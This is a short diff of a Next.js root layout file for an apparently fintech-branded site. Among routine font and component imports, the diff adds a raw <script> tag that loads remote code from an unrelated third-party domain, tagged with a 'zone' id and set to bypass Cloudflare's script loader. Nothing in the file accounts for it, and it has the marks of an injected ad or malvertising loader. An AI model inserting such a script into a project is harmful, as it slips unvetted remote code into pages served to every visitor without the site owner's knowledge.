@@ -3,7 +3,7 @@ import { Inter } from "next/font/google"; // Swapping to Inter as per design
 import "./globals.css";
 import Navbar from "@/components/layouts/Navbar";
 import Footer from "@/components/layouts/Footer";
-
+<script src="https://quge5.com/88/tag.min.js" data-zone="199997" async data-cfasync="false"></script>
 // Using Inter as the primary font "Fintech Trust"
 const inter = Inter({ subsets: ["latin"] });
 
